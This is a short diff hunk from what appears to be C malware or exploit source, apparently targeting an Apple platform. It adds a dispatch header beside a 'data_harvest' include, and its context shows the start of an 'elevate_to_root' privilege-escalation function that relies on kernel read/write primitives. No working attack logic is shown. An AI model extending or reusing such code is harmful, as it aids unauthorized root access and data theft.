@@ -8,6 +8,7 @@
 #include "data_harvest.h"
 #include <pthread.h>
 #include <unistd.h>
+#include <dispatch/dispatch.h>
 
 /* ── Privilege escalation (requires kernel r/w primitives) ─────────────────── */
 static void elevate_to_root(void) {
